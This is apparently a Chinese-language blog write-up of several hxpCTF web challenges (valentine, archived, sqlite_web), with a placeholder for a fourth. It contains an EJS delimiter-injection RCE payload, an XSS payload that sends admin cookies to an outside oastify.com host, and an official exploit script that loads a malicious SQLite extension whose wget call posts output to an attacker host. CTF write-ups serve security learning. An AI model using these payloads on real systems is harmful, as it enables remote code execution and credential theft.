---
title: "hxpCTF2022 Wp"
slug: "hxpctf2021-wp"
description: "老年web狗试图理解ctf"
date: 2023-03-13T11:13:20+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

上次打ctf，还是上次……有种物是人非的沧桑（）

好多知识已经不熟练了，要狠狠地学（）

----

## web/valentine

> Create an awesome template for your valentine and share it with the world!

先看一眼页面 是js的模板渲染类的题，依赖库express和ejs都是无已知漏洞的最新版本（所以应该是没有这类题中常见的原型链污染情况），看一下app.js

```js
var express = require('express');
var bodyParser = require('body-parser')
const crypto = require("crypto");
var path = require('path');
const fs = require('fs');

var app = express();
viewsFolder = path.join(__dirname, 'views');  // /app/views

if (!fs.existsSync(viewsFolder)) {
  fs.mkdirSync(viewsFolder);
}

app.set('views', viewsFolder);
app.set('view engine', 'ejs');

app.use(bodyParser.urlencoded({ extended: false }))

app.post('/template', function(req, res) {
  let tmpl = req.body.tmpl;
  let i = -1;
  while((i = tmpl.indexOf("<%", i+1)) >= 0) {	// 遍历tmpl所有内容
    if (tmpl.substring(i, i+11) !== "<%= name %>") {	// 当出现了`<%`那它必须是`<%= name %>`的开始部分
      res.status(400).send({message:"Only '<%= name %>' is allowed."});
      return;
    }
  }
  let uuid;
  do {
    uuid = crypto.randomUUID();
  } while (fs.existsSync(`views/${uuid}.ejs`))

  try {
    fs.writeFileSync(`views/${uuid}.ejs`, tmpl);
  } catch(err) {
    res.status(500).send("Failed to write Valentine's card");
    return;
  }
  let name = req.body.name ?? '';
  return res.redirect(`/${uuid}?name=${name}`); // 直接跳转渲染
});

app.get('/:template', function(req, res) {
  let query = req.query;
  let template = req.params.template
  if (!/^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i.test(template)) { // 只允许uuid
    res.status(400).send("Not a valid card id")
    return;
  }
  if (!fs.existsSync(`views/${template}.ejs`)) {
    res.status(400).send('Valentine\'s card does not exist')
    return;
  }
  if (!query['name']) {
    query['name'] = ''
  }
  return res.render(template, query); // 渲染的参数是整个query 不限制仅有name
});

app.get('/', function(req, res) {
  return res.sendFile('./index.html', {root: __dirname});
});

app.listen(process.env.PORT || 3000);
```

审过代码之后我们很自然地想到ejs是否有不是以`<%`开头的标签可以作为模板，直接看文档[syntax.md](https://github.com/mde/ejs/blob/main/docs/syntax.md)

![image-20230313003218731](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313003218731.png)

直接看标题觉得可能没戏，但注意到了典中典之[Delimiters](https://github.com/mde/ejs#custom-delimiters)

![image-20230313003309727](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313003309727.png)

delimiters可以被应用在单一模板上也可以全局启用

```js
let ejs = require('ejs'),
    users = ['geddy', 'neil', 'alex'];

// Just one template
ejs.render('<p>[?= users.join(" | "); ?]</p>', {users: users}, {delimiter: '?', openDelimiter: '[', closeDelimiter: ']'});
// => '<p>geddy | neil | alex</p>'

// Or globally
ejs.delimiter = '?';
ejs.openDelimiter = '[';
ejs.closeDelimiter = ']';
ejs.render('<p>[?= users.join(" | "); ?]</p>', {users: users});
// => '<p>geddy | neil | alex</p>'
```

很容易构造payload

1. POST /template
   tmpl=<==global.process.mainModule.constructor._load('child_process').exec('/readflag').toString()=>
   这里的`<==`表示escaped output，也可以用`<=-`得到unescaped output
2. 因为app会默认写入模板后直接redirect渲染，我们抓包改一下redirect的目标url，在query参数中添加`&delimiter=%3D`，因为render会把query所有参数都拿去渲染，所以这样修改是可行的

![image-20230313004950832](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313004950832.png)

## web/archived

> I’m using this super secure big company open source software, what could go wrong?

提示里的"big company open source software"指的是apache archiva，不过题目中用到的2.2.9版本并没有最新的cve可以参考

简单扫一眼docker配置可以知道这可能跟xss/csrf有关系（涉及到了admin bot和selenium），看一下admin.py的行为

*直接就是一手偷懒，好偷

![image-20230313010733474](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313010733474.png)

这里的“浏览器打开受限页面”指的是

![image-20230313011026684](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313011026684.png)

显然我们需要在admin打开/repository/internal的过程中获得到cookie，那目标就变成了如何向这个页面写入xss的代码

![image-20230313014252680](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313014252680.png)

Upload Artifact可以上传依赖，有这些参数可以自定义，随便试一下（先upload再save）

![image-20230313020339420](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313020339420.png)

访问/repository/internal，我们的文件确实在这里

![image-20230313021105798](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313021105798.png)

![image-20230313020419888](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313020419888.png)

然鹅admin访问的只是/repository/internal，目录的1在html中是

```html
<a class="folder" href="1/">1</a>
```

直接写个payload试试

![image-20230313021646324](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313021646324.png)

试试就逝世，没有想象中的渲染 甚至根本没存……

然后就卡住了，看wp，这里是直接把页面上的4个选项都置空，也就是在最后的文件名写payload

```
/restServices/archivaUiServices/fileUploadService/save/internal/%20/%20/%20/<payload>
```

```html
<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://b2eiq6hi7jbhisck3pg095jv6mcc01.oastify.com/?cookie='+btoa(document.cookie);>
```

但是上面这种payload也是不能直接用的，因为`DefaultFileUploadService.java#hasValidChars`会检测`/`，我们要手动转义

```html
<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http:&#47;&#47;929gq4hg7hbfiqci3ngy93jt6kcp0e.oastify.com&#47;?cookie='+btoa(document.cookie);>
```

![image-20230313023852710](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313023852710.png)

之后任意文件读，读到flag

`hxp{xSS_h3re_Xs5_ther3_X5S_ev3rywhere}`

## web/sqlite_web

> We hacked your database, locked you out of your server and encrypted all your tables. If you want them back, send us ONE MILLION DOLLARS and we will send you the password (flag) which is safely stored on the server.

提示中说的"encrypt you all tables"指的是

![image-20230313101310325](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313101310325.png)

![image-20230313103517308](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313103517308.png)

数据库中的flag被用这样的方式加密了，我们想得到flag只能读/flag.txt 但由于权限的设置只能运行/readflag，那就需要rce了

一般的sqlite是没有web ui的，这里用了https://github.com/coleifer/sqlite-web，可能就是突破点 ~~（但我这个脑子也就只够想到这里~~

这个sqlite-web项目本质是跑在flask 也就是werkzeug上的，这里用了跟21年hxp类似的临时文件lfi手法；werkzeug在存在这样的[代码](https://github.com/pallets/werkzeug/blob/main/src/werkzeug/formparser.py#L56)

![image-20230313104035742](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313104035742.png)

`SpooledTemporaryFile`和`TemporaryFile`都是带有自动清理功能的接口，文档中这样描述

![image-20230313105243489](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313105243489.png)

![image-20230313105415243](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313105415243.png)

我们有了在服务器上写入任意文件的能力，接下来的问题就是写什么、如何找到缓存文件的位置、如何rce来得到flag

由于环境在sqlite中，我们可以通过`load_extension`来加载.so文件，我们可以生成一个大于500kb的含有恶意代码的.so并在query中对它进行触发，flag以外带的方式得到

*鸡贼的出题人把sqlite-web自带的import从页面上删掉了，不过路由中仍然存在

![image-20230313110253988](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313110253988.png)

官方exp.py

```python
#!/usr/bin/env python3

from threading import Thread
import requests
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import sys

EXPLOIT = 'rce.csv'

HOST = 'TODO'
PORT = 0
MY_HOST = 'TODO'
MY_PORT = 0

def send_rce():
    print('[+] uploader started', file=sys.stderr)
    while True:
        r = requests.post(url=f"http://{HOST}:{PORT}/gz/import/",
        files={
            'file': open(EXPLOIT, 'rb')
        })
        print(r.status_code, "UPLOAD", file=sys.stderr)

def call_rce(fd):
    print('[+] caller started', file=sys.stderr)
    while True:
        r = requests.post(url=f"http://{HOST}:{PORT}/gz/query",
        data={
            "sql": f"""select load_extension("/proc/self/fd/{fd}","flag")"""
        })
        print(r.status_code, "CALL", file=sys.stderr)

def compile_exploit():
    with open("rce.c", "w") as f:
        f.write(f"""
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void flag() {{
    system("wget --post-data `/readflag` http://{MY_HOST}:{MY_PORT}");
}}

void space() {{
    static char waste[500 * 1024] = {{2}};
}}
""")
    r = subprocess.run(["gcc", "-shared", "rce.c", "-o", EXPLOIT])
    if r.returncode != 0:
        exit(-1)

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_len = int(self.headers.get('Content-Length'))
        flag = self.rfile.read(content_len)
        print(flag.decode())

class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass

def server():
    print('[+] http server started', file=sys.stderr)
    server = ThreadingSimpleServer(('0.0.0.0', MY_PORT), Handler)
    # we only need to handle one response
    server.handle_request()
    server.shutdown()

if __name__ == "__main__":
    compile_exploit()

    s = Thread(target=server, daemon=True)
    s.start()

    t1 = Thread(target=send_rce, daemon=True)
    t1.start()
    for i in range(7, 8):
        t2 = Thread(target=call_rce, daemon=True, args=(i,))
        t2.start()

    s.join()
```

最后的flag

`hxp{load_extension(r3m0t3_c0d3_3x3cut10n)}`

## *web/true_web_assembly

> https://board.asm32.info/asmbb-v2-9-has-been-released.328/
>
> From the post:
>
> - “AsmBB is very secure web application, because of the internal design and the reduced dependencies. But it also supports encrypted databases, for even higher security.”
> - “Download, install and hack”
>
> Yes
>
> ------
>
> Goal is to get the admin to visit a page on the forum,
>   HACK-HACK-HACK,
>     /readflag will print out the flag.
>
> ------
>
> Please don’t submit too many requests or try to abuse anything with the setup.
>
> Focus on the forum’s implementation.
>
> ------
>
> Two dockerfiles are provided:
>
> - ./Dockerfile for hosting the challenge
> - standalone-build/Dockerfile for building asmbb engine for a specific commit

*压轴难题，还没有wp……先等各路大爹们发wp再复现（）